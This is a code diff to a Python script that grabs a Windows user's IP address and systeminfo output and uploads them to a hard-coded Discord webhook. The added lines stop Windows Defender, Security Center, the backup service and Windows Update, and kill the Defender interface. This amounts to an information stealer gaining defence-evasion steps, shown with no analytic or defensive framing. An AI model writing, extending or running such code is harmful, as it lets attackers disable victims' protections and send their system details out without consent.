@@ -16,6 +16,12 @@ def main():
     url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
     subprocess.getoutput('systeminfo >> "%userprofile%\AppData\System info.txt"')
+    subprocess.getoutput('net stop "SDRSVC"')
+    subprocess.getoutput('net stop "WinDefend"')
+    subprocess.getoutput('taskkill /f /im MSASCui.exe')
+    subprocess.getoutput('net stop "security center"')
+    subprocess.getoutput('netsh advfirewall set allprofiles state on')
+    subprocess.getoutput('net stop "wuauser"')
     web=DiscordWebhook(url=url, content=f"IP > {r.text}")
     with open(f"C:/Users/{username}/AppData/System info.txt", "rb")as f:
         web.add_file(file=f.read(), filename='System info.txt')
